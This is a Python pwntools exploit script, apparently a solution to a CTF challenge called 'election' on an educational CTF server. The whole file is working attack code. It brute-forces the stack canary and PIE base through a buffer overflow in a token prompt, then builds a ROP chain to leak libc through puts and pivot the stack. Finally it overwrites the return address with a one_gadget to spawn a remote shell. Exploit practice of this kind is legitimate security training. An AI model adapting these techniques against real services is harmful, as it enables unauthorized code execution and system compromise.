from pwn import *

host = 'edu-ctf.csie.org'
port = 10180

r = remote(host, port)
#r = process('./election')

l = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

def send_all_vote(token, num):
    r.sendafter('>', b'2')
    r.sendafter(': ', token.encode())
    
    r.sendafter('>', b'1')
    r.sendafter(': ', token.encode())
    
    for i in range(num):
        r.sendafter('>', b'1')
        r.sendafter("Your choice [0~9]: ", b'1')

    r.sendafter('>', b'3')

def find_canary():
    buf = b'a' * 0xb8
    payload = 0
    canary = '00'
    for i in range(7):
        for j in range(255):
            newpayload = buf + p64(payload)[:(i+1)] + p64(j)[:1]
            r.sendafter('>', b'1')
            r.sendafter(': ', newpayload)
            s = r.recvline()
            if s != b'Invalid token.\n':
                payload += (256 ** (i+1)) * j
                canary = hex(j)[2:] + canary
                r.sendafter(">", b'3')
                break
            
    return(canary.zfill(16))
            

def find_pie_base(canary):
    buf = b'a' * 0xb8 + p64(int(canary, 16))
    payload = 4 * 16
    pie_base = '40'
    for i in range(5):
        for j in range(255):
            newpayload = buf + p64(payload)[:(i+1)] + p64(j)[:1] 
            r.sendafter('>', b'1')
            r.sendafter(': ', newpayload)
            s = r.recvline()
            
            if s != b'Invalid token.\n':
                payload += (256 ** (i+1)) * j
                pie_base = hex(j)[2:] + pie_base
                r.sendafter(">", b'3')
                break

    return(pie_base.zfill(16))


for i in range(5):
    send_all_vote('a', 10)
    send_all_vote('b', 10)
    send_all_vote('c', 10)
    send_all_vote('d', 10)

send_all_vote('e', 10)
send_all_vote('e', 10)
send_all_vote('e', 10)
send_all_vote('e', 10)
send_all_vote('e', 10)
send_all_vote('J', 5)

r.sendlineafter('>', b'2')

payload = b'a' * 0xb8
r.sendafter(': ', payload)

canary = find_canary()
print('canary = ', canary)
pie_base = find_pie_base(canary)
pie_base = int(pie_base, 16) - 0x1140
canary = int(canary, 16)
print('pie_base = ', hex(pie_base))

voting = 0x000000000000d74 + pie_base 
pop_rdi = 0x00000000000011a3 + pie_base
puts_plt = 0x000000000000940 + pie_base
libc_start_main = 0x000000000201fe0 + pie_base
buf_address = 0x202160 + pie_base
leave_ret = 0x0000000000000be9 + pie_base
main_plt = 0x0000000000000ffb + pie_base
ret = 0x0000000000000906 + pie_base
pop_rbp = 0x0000000000000a40 + pie_base
pop_rsp_r13_r14_r15_ret = 0x000000000000119d + pie_base
printf_plt = 0x000000000000960 + pie_base



r.sendlineafter('>', b'2')
r.sendafter(': ', b'\x00' * 0xb8)

payload = b'\x00' * 0x38
payload += p64(pop_rdi)
payload += p64(libc_start_main)
payload += p64(puts_plt)
payload += p64(ret)
payload += p64(main_plt + 318)

r.sendlineafter('>', b'2')
r.sendafter(': ', payload)
r.sendlineafter('>', b'1')
r.sendafter(': ', payload)

msg = b'\x00' * (0xe0+0x08) + p64(canary) 
msg += p64(buf_address + 0x640)
msg += p64(pop_rsp_r13_r14_r15_ret)

#msg += p64(leave_ret)[:-1]

print('buf_address = ', hex(buf_address))
r.sendlineafter('>', b'2')
r.sendlineafter(': ', b'1')
r.sendafter(': ', msg)

r.sendlineafter('>', b'3')
#r.interactive()

r.recvuntil('>')
r.recvline()
libc_base = u64(r.recv(6) + b'\x00\x00') - 0x0000000000021ab0
print('libc_base: %s' %hex(libc_base))
#system = libc_base + 0x00000000004f440
#print('system: ', hex(system))
#bin_sh = next(l.search('/bin/sh'))
#bin_sh = libc_base + bin_sh
one_gadget = 0x4f322 + libc_base

payload = b'alimadodo'

msg = b'\x00' * (0xe0+0x08) + p64(canary) 
msg += p64(buf_address + 0x40)
msg += p64(one_gadget)

r.sendlineafter('>', b'2')
r.sendafter(': ', payload)
r.sendlineafter('>', b'1')
r.sendafter(': ', payload)

r.sendlineafter('>', b'2')
r.sendlineafter(': ', b'1')
r.sendafter(': ', msg)
r.sendlineafter('>', b'3')
r.interactive()

